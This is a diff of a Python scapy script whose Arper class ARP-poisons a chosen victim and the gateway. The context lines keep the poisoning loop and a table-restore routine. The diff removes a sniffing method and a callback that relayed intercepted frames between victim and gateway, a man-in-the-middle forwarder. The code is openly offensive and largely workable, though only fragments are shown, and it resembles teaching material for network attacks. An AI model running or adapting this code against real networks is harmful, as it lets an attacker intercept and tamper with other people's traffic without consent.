@@ -1,5 +1,4 @@
-from multiprocessing import Process, Event
-from scapy.all import (ARP, Ether, IP, TCP, UDP, conf, get_if_hwaddr,
+from scapy.all import (ARP, Ether, conf, get_if_hwaddr,
                        send, sendp, sniff, sndrcv, srp)
 import sys
 import time
@@ -30,7 +29,6 @@ class Arper:
         print(f'Victim ({victim}) is at {self.victimmac}.')
         print('-' * 30)
 
-        self.stop_flag = Event()
 
     def run(self):
         self.poison_proc = Process(target=self.poison)
@@ -70,40 +68,6 @@ class Arper:
             sendp(Ether(dst=self.gatewaymac) / poison_gateway, verbose=False)
             time.sleep(2)
 
-    def sniff(self):
-        bpf_filter = f"ip host {self.victim}"
-
-        print("Sniffing started...")
-
-        while not self.stop_flag.is_set():
-            sniff(filter=bpf_filter, iface=self.interface, prn=self.packet_callback, store=False)
-
-
-    def packet_callback(self, packet):
-        if not packet.haslayer(Ether):
-            return
-        
-        # pkt = packet.copy()
-
-        if packet[Ether].src == self.victimmac:
-            packet[Ether].dst = self.gatewaymac
-            # print('0')
-        elif packet[Ether].src == self.gatewaymac:
-            packet[Ether].dst = self.victimmac
-            # print('1')
-        else:
-            return
-
-        # # remove checksums so scapy recomputes
-        # if pkt.haslayer(IP):
-        #     del pkt[IP].chksum
-        # if pkt.haslayer(TCP):
-        #     del pkt[TCP].chksum
-        # if pkt.haslayer(UDP):
-        #     del pkt[UDP].chksum
-
-        # print(pkt[IP].chksum)
-        sendp(packet, iface=self.interface, verbose=False)
 
     def restore(self):
         print("Restoring ARP tables...")
